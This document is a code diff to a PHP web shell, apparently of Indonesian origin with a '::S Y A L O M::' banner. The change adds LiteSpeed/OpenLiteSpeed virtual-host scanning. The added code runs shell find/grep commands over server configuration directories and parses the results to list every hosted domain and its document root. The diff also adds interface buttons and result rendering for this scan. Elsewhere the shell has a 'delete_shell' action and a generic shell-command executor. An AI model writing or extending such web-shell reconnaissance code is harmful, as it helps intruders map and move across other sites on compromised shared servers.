@@ -1166,20 +1166,37 @@ if (isset($_GET['action']) && $_GET['action'] === 'scan_virtualhosts') {
     }
     
     // LiteSpeed/OpenLiteSpeed scanning
-    if ($type === 'all') {
+    if ($type === 'all' || $type === 'litespeed') {
         $lsws_paths = [
             '/usr/local/lsws/conf',
             '/var/www/conf',
+            '/usr/local/lsws/conf/vhosts',
         ];
         
         foreach ($lsws_paths as $path) {
             if (is_dir($path)) {
-                $cmd = "grep -r -h -E 'vhRoot|configFile|docRoot' " . escapeshellarg($path) . " 2>/dev/null | head -50";
+                // Try httpd_config.conf for vhost config
+                $httpd_conf = $path . '/httpd_config.conf';
+                if (file_exists($httpd_conf)) {
+                    $content = @file_get_contents($httpd_conf);
+                    if ($content) {
+                        $results['litespeed'] = array_merge($results['litespeed'], parseLiteSpeedVirtualHosts($content));
+                    }
+                }
+                
+                // Try vhost.conf files
+                $cmd = "find " . escapeshellarg($path) . " -name '*.conf' -exec grep -H -E 'vhRoot|docRoot|vhDomain' {} \; 2>/dev/null | head -50";
                 $output = execute_shell_command($cmd);
                 if ($output) {
-                    $results['other'][] = ['type' => 'litespeed', 'raw' => $output];
+                    $results['litespeed'] = array_merge($results['litespeed'], parseLiteSpeedGrepOutput($output));
                 }
             }
+        }
+        
+        // Try LiteSpeed API/CLI
+        $lsws_admin = execute_shell_command("which lswsctrl 2>/dev/null || which olsctrl 2>/dev/null");
+        if ($lsws_admin) {
+            $results['litespeed_detected'] = true;
         }
     }
     
@@ -1270,6 +1287,87 @@ function parseNginxVirtualHosts($output) {
     return array_filter($vhosts, function($v) {
         return !empty($v['domain']);
     });
+}
+
+// 🔥 LiteSpeed VirtualHost Parser
+function parseLiteSpeedVirtualHosts($content) {
+    $vhosts = [];
+    $lines = explode("\n", $content);
+    $current_vhost = null;
+    $in_vhost = false;
+    
+    foreach ($lines as $line) {
+        $line = trim($line);
+        if (empty($line) || strpos($line, '#') === 0) continue;
+        
+        // Match virtualhost { block start
+        if (preg_match('/^virtualhost\s+(\w+)\s*\{/i', $line, $matches)) {
+            $in_vhost = true;
+            $current_vhost = ['name' => $matches[1], 'domain' => '', 'docroot' => '', 'configfile' => ''];
+        }
+        // Match vhRoot
+        elseif ($in_vhost && preg_match('/vhRoot\s+(.+)/i', $line, $matches)) {
+            $current_vhost['docroot'] = trim($matches[1]);
+        }
+        // Match configFile
+        elseif ($in_vhost && preg_match('/configFile\s+(.+)/i', $line, $matches)) {
+            $current_vhost['configfile'] = trim($matches[1]);
+            // Try to parse vhost config file for domain
+            if (file_exists($current_vhost['configfile'])) {
+                $vhost_config = @file_get_contents($current_vhost['configfile']);
+                if ($vhost_config && preg_match('/vhDomain\s+(.+)/i', $vhost_config, $domain_match)) {
+                    $current_vhost['domain'] = trim($domain_match[1]);
+                }
+            }
+        }
+        // Match vhDomain directly
+        elseif ($in_vhost && preg_match('/vhDomain\s+(.+)/i', $line, $matches)) {
+            $current_vhost['domain'] = trim($matches[1]);
+        }
+        // Match docRoot directly
+        elseif ($in_vhost && preg_match('/docRoot\s+(.+)/i', $line, $matches)) {
+            $current_vhost['docroot'] = trim($matches[1]);
+        }
+        // Block end
+        elseif ($in_vhost && $line === '}') {
+            if (!empty($current_vhost['domain']) || !empty($current_vhost['docroot'])) {
+                $vhosts[] = [
+                    'domain' => $current_vhost['domain'] ?: $current_vhost['name'],
+                    'docroot' => $current_vhost['docroot'],
+                    'listen' => '80/443'
+                ];
+            }
+            $in_vhost = false;
+            $current_vhost = null;
+        }
+    }
+    
+    return array_filter($vhosts, function($v) {
+        return !empty($v['domain']);
+    });
+}
+
+function parseLiteSpeedGrepOutput($output) {
+    $vhosts = [];
+    $lines = explode("\n", $output);
+    
+    foreach ($lines as $line) {
+        // Format: file:vhRoot path
+        if (preg_match('/^(.+):vhRoot\s+(.+)$/i', $line, $matches)) {
+            $docroot = trim($matches[2]);
+            // Try to extract domain from path
+            $domain = basename($docroot);
+            if (strpos($domain, '.') !== false) {
+                $vhosts[] = [
+                    'domain' => $domain,
+                    'docroot' => $docroot,
+                    'listen' => '80/443'
+                ];
+            }
+        }
+    }
+    
+    return $vhosts;
 }
 
 if (isset($_POST['action']) && $_POST['action'] === 'delete_shell') {
@@ -2897,7 +2995,7 @@ function list_dir($path) {
 <body>
 <div class="container">
     <div class="menu-panel">
-        <h1>::S Y A L O M:: ~ 270326 2029</h1>
+        <h1>::S Y A L O M:: ~ 280326 1639</h1>
         <!-- Quick Actions Row -->
         <div class="section">
             <h3>⚡ Quick Actions</h3>
@@ -3435,9 +3533,14 @@ function list_dir($path) {
                             🔍 Nginx
                         </button>
                     </div>
-                    <button onclick="scanVirtualHosts('all')" style="width:100%;padding:8px;background:#6cf;color:#111;font-size:11px;font-weight:bold;">
-                        🔍 Scan All Web Servers
-                    </button>
+                    <div style="display:flex;gap:5px;margin-bottom:8px;">
+                        <button onclick="scanVirtualHosts('litespeed')" style="flex:1;padding:8px;background:#f0f;color:#111;font-size:11px;font-weight:bold;">
+                            🔍 LiteSpeed
+                        </button>
+                        <button onclick="scanVirtualHosts('all')" style="flex:1;padding:8px;background:#6cf;color:#111;font-size:11px;font-weight:bold;">
+                            🔍 All Servers
+                        </button>
+                    </div>
                 </div>
                 
                 <div id="scanStats" style="margin-top:15px;padding:10px;background:#1a1a1a;border-radius:4px;font-size:11px;color:#888;display:none;">
@@ -4604,6 +4707,18 @@ try {
                 });
             }
             
+            if (data.litespeed && data.litespeed.length > 0) {
+                data.litespeed.forEach(vhost => {
+                    allVhosts.push({
+                        domain: vhost.domain,
+                        docroot: vhost.docroot,
+                        aliases: [],
+                        server: 'LiteSpeed',
+                        listen: vhost.listen || '80/443'
+                    });
+                });
+            }
+            
             // Remove duplicates by domain
             const seen = new Set();
             allVhosts = allVhosts.filter(vhost => {
@@ -4648,12 +4763,14 @@ function renderVirtualHostResults(vhosts, content) {
     
     const apacheCount = vhosts.filter(v => v.server === 'Apache').length;
     const nginxCount = vhosts.filter(v => v.server === 'Nginx').length;
+    const litespeedCount = vhosts.filter(v => v.server === 'LiteSpeed').length;
     
     let html = `<div style="background: linear-gradient(135deg, #0f0, #0a0); color: #000; padding: 15px; border-radius: 4px; margin-bottom: 15px; text-align: center;">`;
     html += `<strong style="font-size: 16px;">🌐 ${vhosts.length} VirtualHost Ditemukan!</strong>`;
     html += `<div style="font-size: 12px; margin-top: 8px;">`;
     if (apacheCount > 0) html += `<span style="margin-right: 15px;">🔴 Apache: ${apacheCount}</span>`;
-    if (nginxCount > 0) html += `<span>🟢 Nginx: ${nginxCount}</span>`;
+    if (nginxCount > 0) html += `<span style="margin-right: 15px;">🟢 Nginx: ${nginxCount}</span>`;
+    if (litespeedCount > 0) html += `<span>🟣 LiteSpeed: ${litespeedCount}</span>`;
     html += `</div></div>`;
     
     // Group by server type
@@ -4666,8 +4783,18 @@ function renderVirtualHostResults(vhosts, content) {
     // Render each group
     Object.keys(grouped).forEach(serverType => {
         const serverVhosts = grouped[serverType];
-        const serverColor = serverType === 'Apache' ? '#f80' : '#0f0';
-        const serverIcon = serverType === 'Apache' ? '🔴' : '🟢';
+        const serverColors = {
+            'Apache': '#f80',
+            'Nginx': '#0f0',
+            'LiteSpeed': '#f0f'
+        };
+        const serverIcons = {
+            'Apache': '🔴',
+            'Nginx': '🟢',
+            'LiteSpeed': '🟣'
+        };
+        const serverColor = serverColors[serverType] || '#6cf';
+        const serverIcon = serverIcons[serverType] || '⚪';
         
         html += `<div style="margin-bottom: 20px;">`;
         html += `<div style="background: #1a1a1a; padding: 10px 15px; border-left: 4px solid ${serverColor}; margin-bottom: 10px;">`;
